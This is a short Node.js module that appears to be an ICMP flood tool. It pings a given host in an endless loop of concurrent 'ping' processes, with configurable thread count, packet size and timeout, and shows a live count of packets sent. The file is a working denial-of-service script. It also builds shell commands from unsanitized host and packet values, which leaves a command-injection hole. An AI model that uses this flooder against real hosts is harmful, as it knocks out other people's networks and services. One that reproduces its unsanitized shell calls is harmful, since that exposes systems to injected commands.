const readline = require('readline');
const util = require('util');
const pre_exec = util.promisify(require('child_process').exec);
const { exec } = require('child_process');
const { setTimeout } = require('timers/promises');

const startTime = new Date();


module.exports = async (host, port, timeout, threads, packet) => {
    /*
     * -q: hide output
     * -p: packet fill content
     * -s: packet size (bytes)
     * -w: deadline (seconds)
     * -c: stop after <count> replies
    */
    await pre_exec(`ping ${host} -q -p 0 -s ${packet} -w 5 -c 1`,
        async (error, stdout, stderr) => {
            if (error) {
                console.log(error);
                console.log('\nstop all process.');
                process.exit(1);
            }
            //console.log('pre_exec finish');
            ICMP(host, port, timeout, threads, packet)
        });
}


async function ICMP(host, port, timeout, threads, packet) {
    let packetSend = 0;
    while (true) {
        let nowTime = new Date();

        if (timeout && nowTime.getTime() >= (startTime.getTime() + (Number(timeout) * 1000))) {
            console.log('\nstop all process.');
            process.exit(1);
        }

        await setTimeout(0);
        for (let i = 0; i < Number(threads); i++) {
            exec(`ping ${host} -q -p 0 -s ${packet} -w 5`, () => {
                consoleOutputEditor(packetSend++)
            });
        }
    }
}


function consoleOutputEditor(packetSend) {
    //readline.clearLine(process.stdout);
    readline.cursorTo(process.stdout, 0);
    process.stdout.write(`Sent ICMP Packet: ${packetSend}`);
}